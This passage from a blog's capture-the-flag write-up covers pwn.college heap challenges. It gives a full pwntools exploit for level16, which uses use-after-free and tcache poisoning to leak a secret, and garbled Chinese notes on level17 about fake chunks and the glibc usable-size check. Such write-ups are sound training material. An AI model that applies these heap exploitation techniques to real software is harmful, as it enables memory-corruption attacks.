= process(<span class="string">&#x27;/challenge/babyheap_level16.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index, size = <span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode() </span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr,size = <span class="number">0x10</span></span>):		//addr must be aligned to <span class="number">0x10</span></span><br><span class="line">    malloc(<span class="number">3</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)</span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = puts(<span class="number">1</span>)</span><br><span class="line">    chunk2_next = puts(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = <span class="built_in">int</span>.from_bytes(chunk1_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    chunk2_next = <span class="built_in">int</span>.from_bytes(chunk2_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(chunk1_next))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next previously = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    chunk2_next = chunk1_next ^ addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next now = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    scanf(<span class="number">2</span>,p64(chunk2_next))</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)    </span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    chunk3_next = puts(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">    chunk3_next = <span class="built_in">int</span>.from_bytes(chunk3_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ep = chunk1_next ^ chunk3_next</span><br><span class="line">    data = (addr &gt;&gt; <span class="number">12</span>) ^ ep</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x433050</span></span><br><span class="line">malloc(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">page_num = puts(<span class="number">9</span>)</span><br><span class="line">page_num = <span class="built_in">int</span>.from_bytes(page_num, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(page_num))</span><br><span class="line"></span><br><span class="line">data = leak(secret_addr,<span class="number">0x10</span>)		//secret_addr = <span class="number">0x433050</span> <span class="keyword">is</span> aligned to <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">data = data.to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">payload = data + p64(<span class="number">0</span>) </span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">send_flag(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="level17-0"><a href="#level17-0" class="headerlink" title="level17.0"></a>level17.0</h3><p>ret2text</p>
<p>åˆ©ç”¨å †UAFå°†è¿”å›åœ°å€æ”¾åˆ°å †å—ä¸Š</p>
<p>è°ƒè¯•å‘ç°è¿”å›åœ°å€éƒ½å¯¹é½åˆ°0x8</p>
<p>ä¸æ»¡è¶³å †å—å¯¹é½åˆ°0x10çš„è¦æ±‚</p>
<p>å› æ­¤å‡å †å—å¯ä»¥åœ¨è¿”å›åœ°å€-0x8,-0x18ç­‰å¤„</p>
<p>ä½†æ˜¯è¿˜æœ‰é«˜æ‰‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">sprintf</span>(input, <span class="string">&quot;%%%us&quot;</span>, v3);</span><br><span class="line">v4 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] scanf(\&quot;%%%us\&quot;, allocations[%d])\n&quot;</span>, v4, index_2);</span><br><span class="line"><span class="built_in">scanf</span>(input, chunks[index_2]);</span><br></pre></td></tr></table></figure>

<p>åœ¨å¾€å‡å †å—å†™å…¥ä¹‹å‰,è¿˜æœ‰ä¸€ä¸ªåº“å‡½æ•°<code>malloc_usable_size</code>è°ƒç”¨,è¿™ä½æ›´æ˜¯é‡é‡çº§,ä»–ä¼šè°ƒç”¨<code>musable</code></p>
<p>è¿™ä½æ›´æ˜¯é‡ä¸­ä¹‹é‡é‡çº§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">musable</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))</span><br><span class="line">        <span class="keyword">return</span> chunksize(p) - CHUNK_HDR_SZ;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (inuse(p))</span><br><span class="line">        <span class="keyword">return</span> memsize(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>p</code>æ²¡æœ‰<code>Mmap (2)</code>æ ‡å¿—ä½,ä¼šè°ƒç”¨<code>inuse(p)</code>è¿™ä¸ªå‡½æ•°ä¼šæŸ¥çœ‹<strong>ä¸‹ä¸€ä¸ª</strong>å †å—çš„<code>Prev_in_use (1)</code>æ ‡å¿—ä½æ¥åˆ¤å®š<strong>å½“å‰</strong>å †å—æ˜¯å¦ä½¿ç”¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<p>æ‰¾ä¸‹ä¸€ä¸ªå †å—çš„ä¾æ®æ˜¯æœ¬å †å—çš„<code>size</code>,</p>
<p>ä¹Ÿå°±æ˜¯è¯´<code>p + p.size</code>å°±åç§»åˆ°äº†ä¸‹ä¸€ä¸ªå †å—</p>
<p>é—®é¢˜å°±æ¥äº†,æœ¬å †å—çš„<code>size</code>æ˜¯ä¸èƒ½ç¡®å®šçš„,æœ¬å †å—æ˜¯ä¸€ä¸ªå‡å †å—,å¾ˆå¯èƒ½æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°</p>
<p>å¯¼è‡´<code>p+p.size</code>æŒ‡å‘éæ³•å†…å­˜åŒºåŸŸ,å¯¼è‡´<code>(p + p.size)-&gt;size </code>è§£å¼•ç”¨å¤±è´¥,å¯¼è‡´ç¨‹åºå´©æºƒ</p>
<p>ç°åœ¨è€ƒè™‘æˆ‘ä»¬å¯èƒ½çš„å—å®³è€…è¿”å›åœ°å€</p>
<p>main ret2 libc_start_main</p>
<p>libc_start_main ret2 start</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="page-number current">2</span><a class="page-number" href="/impossible/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/11/">11</a><a class="extend next" rel="next" href="/impossible/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
